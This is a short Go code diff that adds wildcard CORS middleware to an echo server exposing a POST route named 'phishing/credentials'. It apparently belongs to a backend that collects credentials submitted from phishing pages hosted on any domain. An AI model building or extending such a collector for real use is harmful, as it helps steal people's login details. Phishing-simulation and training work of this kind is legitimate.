@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"github.com/labstack/echo"
+	"github.com/labstack/echo/middleware"
 	"github.com/IBM/cloudant-go-sdk/cloudantv1"
 	"github.com/google/uuid"
 	"encoding/json"
@@ -70,10 +71,12 @@ func HandleCredentials(c echo.Context) error {
 	return c.String(http.StatusOK, "{\"status\":\"ok\"}")
 }
 
-
 func main() {
 	e := echo.New()
+	e.Use(middleware.CORSWithConfig(middleware.CORSConfig{
+		AllowOrigins: []string{"*"},
+		AllowHeaders: []string{echo.HeaderOrigin, echo.HeaderContentType, echo.HeaderAccept},
+	}))
 	e.POST("phishing/credentials", HandleCredentials)
-
 	e.Logger.Fatal(e.Start(":" + SERVER_PORT))
 }
